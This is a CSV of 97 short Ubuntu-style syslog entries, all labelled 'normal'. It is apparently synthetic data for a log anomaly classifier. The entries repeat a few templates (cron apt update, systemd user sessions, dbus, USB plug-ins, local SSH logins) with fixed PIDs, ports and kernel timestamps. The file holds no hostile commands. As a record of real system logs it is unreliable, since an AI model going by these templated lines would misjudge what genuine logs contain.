id,log_text,label
1,Jan 3 14:43:15 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
2,Jan 19 02:03:27 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
3,Jan 3 10:30:34 kernel: [ 1234.56 ] USB device plugged in.,normal
4,Jan 4 13:14:20 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
5,Jan 21 22:38:07 kernel: [ 1234.56 ] USB device plugged in.,normal
6,Jan 21 00:23:52 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
7,Jan 20 09:19:49 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
8,Jan 3 17:22:03 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
9,Jan 1 06:25:34 kernel: [ 1234.56 ] USB device plugged in.,normal
10,Jan 26 19:13:36 kernel: [ 1234.56 ] USB device plugged in.,normal
11,Jan 15 04:55:21 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
12,Jan 5 23:46:18 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
13,Jan 9 14:50:09 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
14,Jan 11 15:57:16 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
15,Jan 11 01:09:43 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
16,Jan 6 19:33:05 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
17,Jan 14 23:03:49 ubuntu sshd[2210]: Accepted password for user from 192.168.1.225 port 55822 ssh2,normal
18,Jan 18 06:30:58 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
19,Jan 18 18:18:38 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
20,Jan 28 13:41:54 ubuntu sshd[2210]: Accepted password for user from 192.168.1.203 port 55822 ssh2,normal
21,Jan 23 02:51:09 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
22,Jan 16 22:13:06 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
23,Jan 12 20:46:10 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
24,Jan 22 09:20:25 kernel: [ 1234.56 ] USB device plugged in.,normal
25,Jan 3 04:34:17 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
26,Jan 25 08:15:24 ubuntu sshd[2210]: Accepted password for user from 192.168.1.104 port 55822 ssh2,normal
27,Jan 28 02:07:46 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
28,Jan 28 19:58:03 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
29,Jan 27 16:23:44 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
30,Jan 26 03:19:20 kernel: [ 1234.56 ] USB device plugged in.,normal
31,Jan 11 14:22:54 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
32,Jan 14 13:14:11 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
33,Jan 15 00:27:29 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
34,Jan 11 07:29:24 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
35,Jan 7 12:59:23 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
36,Jan 11 22:37:40 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
37,Jan 5 11:04:55 ubuntu sshd[2210]: Accepted password for user from 192.168.1.200 port 55822 ssh2,normal
38,Jan 14 14:56:13 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
39,Jan 16 01:55:49 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
40,Jan 13 00:39:24 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
41,Jan 10 17:59:21 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
42,Jan 22 21:50:08 kernel: [ 1234.56 ] USB device plugged in.,normal
43,Jan 25 06:19:37 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
44,Jan 2 02:44:52 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
45,Jan 11 23:03:42 ubuntu sshd[2210]: Accepted password for user from 192.168.1.198 port 55822 ssh2,normal
46,Jan 2 07:44:12 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
47,Jan 19 06:36:19 kernel: [ 1234.56 ] USB device plugged in.,normal
48,Jan 20 23:40:42 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
49,Jan 8 02:37:18 ubuntu sshd[2210]: Accepted password for user from 192.168.1.208 port 55822 ssh2,normal
50,Jan 1 23:02:04 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
51,Jan 2 17:11:09 kernel: [ 1234.56 ] USB device plugged in.,normal
52,Jan 9 21:46:45 kernel: [ 1234.56 ] USB device plugged in.,normal
53,Jan 7 21:35:52 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
54,Jan 3 04:41:48 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
55,Jan 9 23:31:12 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
56,Jan 26 11:15:29 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
57,Jan 18 19:25:52 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
58,Jan 6 01:27:53 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
59,Jan 18 03:02:49 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
60,Jan 22 21:19:23 kernel: [ 1234.56 ] USB device plugged in.,normal
61,Jan 12 09:10:48 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
62,Jan 24 05:12:10 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
63,Jan 27 06:27:26 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
64,Jan 22 07:58:09 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
65,Jan 25 14:14:54 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
66,Jan 8 17:16:06 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
67,Jan 5 00:53:04 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
68,Jan 8 07:39:50 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
69,Jan 22 19:49:23 ubuntu sshd[2210]: Accepted password for user from 192.168.1.173 port 55822 ssh2,normal
70,Jan 3 12:52:03 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
71,Jan 25 00:01:03 kernel: [ 1234.56 ] USB device plugged in.,normal
72,Jan 22 15:16:15 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
73,Jan 12 20:40:29 kernel: [ 1234.56 ] USB device plugged in.,normal
74,Jan 25 01:30:38 ubuntu sshd[2210]: Accepted password for user from 192.168.1.109 port 55822 ssh2,normal
75,Jan 5 15:27:48 ubuntu sshd[2210]: Accepted password for user from 192.168.1.7 port 55822 ssh2,normal
76,Jan 5 07:44:37 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
77,Jan 22 18:05:20 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
78,Jan 2 22:01:33 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
79,Jan 27 14:54:11 kernel: [ 1234.56 ] USB device plugged in.,normal
80,Jan 26 10:33:25 kernel: [ 1234.56 ] USB device plugged in.,normal
81,Jan 1 14:09:12 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
82,Jan 28 07:43:02 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
83,Jan 10 02:04:27 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
84,Jan 6 20:26:22 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
85,Jan 11 17:58:21 ubuntu sshd[2210]: Accepted password for user from 192.168.1.66 port 55822 ssh2,normal
86,Jan 16 15:17:59 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
87,Jan 21 13:34:25 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
88,Jan 16 11:28:07 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
89,Jan 1 17:01:29 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
90,Jan 21 11:32:20 ubuntu sshd[2210]: Accepted password for user from 192.168.1.170 port 55822 ssh2,normal
91,Jan 23 02:56:06 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
92,Jan 6 06:13:15 ubuntu sshd[2210]: Accepted password for user from 192.168.1.111 port 55822 ssh2,normal
93,Jan 9 03:55:06 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
94,Jan 14 03:44:41 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
95,Jan 25 20:44:58 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
96,Jan 23 15:59:59 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
97,Jan 18 14:44:29 ubuntu sshd[2210]: Accepted password for user from 192.168.1.89 port 55822 ssh2,normal
